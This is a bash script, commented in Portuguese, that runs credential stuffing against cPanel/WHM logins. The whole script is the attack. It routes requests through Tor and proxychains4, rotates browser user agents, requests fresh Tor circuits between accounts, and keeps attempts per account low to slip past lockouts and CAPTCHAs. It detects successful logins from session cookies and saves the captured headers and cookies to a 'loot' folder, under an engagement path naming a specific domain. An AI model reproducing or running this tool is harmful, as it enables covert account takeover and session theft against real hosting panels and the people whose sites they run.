#!/bin/bash
# cs_cpanel.sh — cred-stuffing rate-limited cPanel/WHM via Tor (proxychains4)
# OPSEC: max 3 tentativas/conta/circuito, NEWNYM entre contas, log sem senha em claro
ENG=/home/ubuntu/pmminas.com
LOG=$ENG/webapp/credstuffing_cpanel.log
UA1="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
UA2="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
UA3="Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"

circuit() {
  timeout 40 curl -s --socks5-hostname 127.0.0.1:9050 --max-time 25 \
    https://check.torproject.org/api/ip 2>/dev/null \
    | python3 -c "import json,sys; print(json.load(sys.stdin).get('IP','?'))" 2>/dev/null || echo "tor-exit-?"
}

newnym() {
  local cookie
  cookie=$(sudo xxd -p /var/run/tor/control.authcookie | tr -d '\n')
  printf "AUTHENTICATE %s\nSIGNAL NEWNYM\nQUIT\n" "$cookie" | sudo nc -U -w8 /var/run/tor/control >/dev/null 2>&1
  sleep 12
  echo "[newnym] circuito agora: $(circuit)"
}

# attempt <host:porta> <user> <pass> <circuito> [curl-args extra...]
attempt() {
  local target="$1" user="$2" pass="$3" exitip="$4"; shift 4
  local ts phash code out hdr sig
  ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  phash=$(printf '%s' "$pass" | sha256sum | cut -c1-16)
  local ua; ua=$(echo "$UA1 $UA2 $UA3" | tr ' ' '\n' | shuf -n1)
  out=$(mktemp); hdr=$(mktemp)
  code=$(proxychains4 -q curl -sk -o "$out" -D "$hdr" -w "%{http_code}" --max-time 120 \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: text/html,application/xhtml+xml" \
    -H "User-Agent: $ua" \
    --data-urlencode "user=$user" --data-urlencode "pass=$pass" \
    "https://$target/login/" "$@" 2>/dev/null)
  sig=""
  if [ "$code" != "401" ] && grep -q "cpsession=" "$hdr" && ! grep -q "pre%3a" "$hdr"; then
    sig="SUCCESS(cpsess)"
  elif [ "$code" != "401" ] && grep -qi "whostmgrsession" "$hdr"; then
    sig="SUCCESS(WHM-session)"
  elif [ "$code" != "401" ] && grep -qi "^Location:" "$hdr"; then
    sig="SUCCESS(redirect:$(grep -i '^Location:' "$hdr" | head -1 | tr -d '\r' | cut -d' ' -f2))"
  fi
  if [ -z "$sig" ]; then
    grep -qi "just a moment" "$out" && sig="CF-challenge"
    [ "$code" = "401" ] && sig="invalid-creds(401)"
    grep -qi "captcha" "$out" && sig="${sig:+$sig }captcha"
    grep -qiE "excessive|too many|blocked|locked" "$out" && sig="${sig:+$sig }lockout"
    [ -z "$sig" ] && sig="http$code-resp-$(wc -c < "$out")B"
  fi
  local respsnip
  respsnip=$(tr '\n' ' ' < "$out" | grep -oiE 'invalid[^<]{0,40}|access denied[^<]{0,40}|just a moment[^<]{0,30}|captcha[^<]{0,30}' | head -1 | cut -c1-60)
  echo "$ts | $target | user=$user | pwd-sha256-16=$phash | http=$code | circuito=$exitip | $sig ${respsnip:+[$respsnip]}" >> "$LOG"
  echo "  [$ts] $target $user/$phash -> http=$code $sig"
  if [[ "$sig" == SUCCESS* ]]; then
    cp "$hdr" "$ENG/loot/cpanel_SUCCESS_hdrs_$(echo $target | tr ':' '_').txt"
    cp "$out" "$ENG/loot/cpanel_SUCCESS_body_$(echo $target | tr ':' '_').html"
    echo ">>> SUCESSO: cred $user em $target — cookies salvos em loot/ — PARANDO TUDO (OPSEC)"
    rm -f "$out" "$hdr"
    exit 42
  fi
  rm -f "$out" "$hdr"
  sleep 2
}

# round <host:porta> <circuito> <combos user:pass ...> -- <curl-args extras...>
round() {
  local target="$1" exitip="$2"; shift 2
  local combos=() curlargs=() sep=0 a
  for a in "$@"; do
    if [ "$a" = "--" ]; then sep=1; continue; fi
    if [ $sep -eq 0 ]; then combos+=("$a"); else curlargs+=("$a"); fi
  done
  for c in "${combos[@]}"; do
    local user="${c%%:*}" pass="${c#*:}"
    attempt "$target" "$user" "$pass" "$exitip" "${curlargs[@]}"
    if [ $? -eq 42 ]; then exit 42; fi
  done
}